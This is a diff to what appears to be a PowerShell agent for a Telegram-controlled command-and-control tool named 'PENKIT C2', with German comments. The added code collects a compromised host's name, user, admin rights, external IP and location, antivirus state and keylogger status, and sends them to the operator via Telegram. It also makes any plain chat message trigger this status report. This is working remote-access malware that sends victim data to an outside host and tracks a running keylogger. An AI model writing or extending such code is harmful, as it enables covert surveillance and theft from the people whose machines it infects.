@@ -545,6 +545,40 @@ function Handle-Command {
         TG-Send "👋 <b>Agent beendet.</b>`n<code>$env:USERNAME@$env:COMPUTERNAME</code> ist offline."
         exit 0
     }
+
+    # Unbekannter Befehl
+    if ($Text.StartsWith("!")) {
+        TG-Send "❓ Unbekannter Befehl: <code>$Text</code>`nAlle Befehle: <code>!help</code>"
+        return
+    }
+}
+
+function Send-StatusPing {
+    $priv   = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "⚡ ADMIN" } else { "👤 User" }
+    $extip  = try { Invoke-RestMethod "https://api.ipify.org" -ErrorAction Stop -TimeoutSec 3 } catch { "?" }
+    $loc    = try { $r = Invoke-RestMethod "https://ipinfo.io/$extip/json" -ErrorAction Stop -TimeoutSec 3; "$($r.city), $($r.country)" } catch { "?" }
+    $os     = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue)
+    $uptime = if ($os) { $u = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime); "$($u.Days)d $($u.Hours)h $($u.Minutes)m" } else { "?" }
+    $ram    = try { $cs = Get-WmiObject Win32_OperatingSystem; "$([math]::Round(($cs.TotalVisibleMemorySize - $cs.FreePhysicalMemory)/1MB, 1))/$([math]::Round($cs.TotalVisibleMemorySize/1MB,1)) GB" } catch { "?" }
+    $procs  = (Get-Process -ErrorAction SilentlyContinue).Count
+    $av     = try { $s = Get-MpComputerStatus -ErrorAction Stop; if ($s.RealTimeProtectionEnabled) { "🛡️ AV aktiv" } else { "⚠️ AV deaktiviert" } } catch { "❓ unbekannt" }
+    $klStatus = if ($script:KLJob) { "⌨️ Keylogger läuft" } else { "" }
+
+    $msg  = "💀 <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n"
+    $msg += "    ⚡ <b>PENKIT C2 — STATUS</b>`n"
+    $msg += "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n`n"
+    $msg += "🟢 <b>Agent:</b>   Online`n"
+    $msg += "💻 <b>Host:</b>    <code>$env:COMPUTERNAME</code>`n"
+    $msg += "👤 <b>User:</b>    <code>$env:USERNAME</code>  $priv`n"
+    $msg += "🌐 <b>IP:</b>      <code>$extip</code>  📍 <code>$loc</code>`n"
+    $msg += "⏱️ <b>Uptime:</b>  <code>$uptime</code>`n"
+    $msg += "🧠 <b>RAM:</b>     <code>$ram</code>`n"
+    $msg += "🔄 <b>Prozesse:</b> <code>$procs</code>`n"
+    $msg += "$av`n"
+    if ($klStatus) { $msg += "$klStatus`n" }
+    $msg += "`n⏰ <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>`n"
+    $msg += "`n📋 <code>!help</code> — alle Befehle"
+    TG-Send $msg
 }
 """
 
@@ -589,8 +623,13 @@ while ($true) {
     foreach ($u in $updates) {
         $offset = $u.update_id + 1
         $text = $u.message.text
-        if ($text -and $text.StartsWith("!")) {
-            Handle-Command -Text $text.Trim() -MsgId $u.message.message_id
+        if (-not $text) { continue }
+        $text = $text.Trim()
+        if ($text.StartsWith("!")) {
+            Handle-Command -Text $text -MsgId $u.message.message_id
+        } else {
+            # Jede normale Nachricht → Status-Ping
+            Send-StatusPing
         }
     }
     Start-Sleep -Seconds {INTERVAL}
